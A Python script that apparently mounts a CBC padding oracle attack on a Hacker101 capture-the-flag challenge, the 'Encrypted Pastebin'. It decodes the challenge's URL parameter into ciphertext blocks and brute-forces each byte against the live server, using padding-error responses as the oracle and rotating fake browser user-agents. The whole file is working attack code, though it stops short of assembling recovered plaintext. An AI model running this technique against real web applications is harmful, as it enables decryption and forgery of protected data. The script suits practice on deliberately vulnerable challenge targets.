#!venv/bin/python3 
import requests
import fake_useragent
import base64
import time
import copy

url="https://7223d0d3fc1a95817307e9c7bce369a2.ctf.hacker101.com/?post=PyBAupqqEqOKlr3Gr95RCZOEx7RihFkIKW6-1maVmeTc4mNa0oMafEZfOIGbHEtzW4DC2JMEb7NGX97N55cU7lch7q3O9tSHAJl4TbnX168YXvvkMzOp-BYI5wJyUYghsrn7xUUZLjxUd7lg-PSjAHgtWwLfDpTmmP0x1888GWqK0WWcI-b0Qh1Qci88CL8Og3htJrMpaE4!wAzav!IAYQ~~"
domain=url.split("?")[0]
params=url.split("=")[1]
ua = fake_useragent.UserAgent()
n=32

#Get the hex from the fake b64 param.
data=base64.b64decode(params.replace("~", "=").replace("-", "+").replace("!", "/"))
data=int.from_bytes(data, byteorder="big")
data=f"{data:x}"
print(data)
blocks= list(map(bytearray.fromhex, [data[i:i+n] for i in range(0, len(data), n)]))
original_block = copy.deepcopy(blocks)

def padding_correct(response):
    text = response.text
    if "Encrypted Pastebin" in text:
        return True
    elif "PaddingException" in text:
        return False
    elif "Traceback" in text:
        print("unexpected! (possible 0x01 padding now...)")
        return True 
    else:
        print(text)
        raise Exception("Weird response from the Oracle.")

def hex_to_url_b64(dump):
    #print(dump)
    return base64.b64encode(bytes.fromhex(dump)).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')

def blocks_to_dump(blocks):
    return ''.join([f"{int.from_bytes(block, byteorder='big'):032x}" for block in blocks])

def tune_padding(byte_array, block):
    padding_length = len(byte_array)
    # n^m=p {n=original block ciphered n-1, m=changed block ciphered n-1 for the padding, p=the padding}
    print("Tengo que hacerlo con" + str(padding_length))
    print(blocks[block])
    for to_change in range(padding_length):
        print(f"changing {blocks[block][16-(to_change+1)]} to be... 0x{padding_length:02x} on the +1 block.")
        print(f"The original value of the plaintex was")
        original_value = blocks[block][16-to_change-1]^original_block[block][16-to_change-1]^padding_length
        print(blocks[block][16-to_change-1],original_block[block][16-to_change-1],padding_length)
        print(blocks[block][16-to_change-1])
        print(f"Now we change it to {padding_length+1}")
        blocks[block][16-to_change-1] = original_block[block][16-to_change-1]^original_value^(padding_length+1)
        print(blocks[block][16-to_change-1])

for block in reversed(range(1, len(blocks))):
    guesses = bytearray()
    possible_bytes = bytearray() 
    for byte_position in reversed(range(16)):
        # pre
        if byte_position<15:
            tune_padding(guesses, block)
            possible_bytes=bytearray()
        for i in range(256):
            blocks[block][byte_position] = i
            payload=hex_to_url_b64(blocks_to_dump(blocks))
            response = requests.get(f"{domain}?post={payload}", headers={'User-Agent': ua.chrome})  
            if padding_correct(response):
                print(f"\033[32m[+++][====]Possible with the byte {hex(i)}[=+===+==]\033[0m")
                possible_bytes.append(i)
                print(possible_bytes)
            else:
                print(f"\033[31mTrying with byte value {i} on the {byte_position}th position of the {block}th block\033[0m")
        if len(possible_bytes)==1:
            guesses.append(possible_bytes[0])
        else:
            print(possible_bytes)
            raise Exception("Possible 0x02..0xFF padding")
